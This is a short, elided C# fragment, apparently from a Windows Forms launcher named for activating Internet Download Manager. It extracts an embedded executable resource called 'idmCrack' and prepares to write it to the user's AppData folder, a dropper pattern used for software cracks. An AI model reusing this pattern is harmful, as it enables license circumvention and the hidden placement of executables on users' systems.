...
namespace RTA_Activation_IDM
{
    public partial class Form1 : Form
    {
        ...
        {
            byte[] exeBytes = Properties.Resources.idmCrack;
            string exeToRun = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            exeToRun = (exeToRun + @"idmCrack.exe");
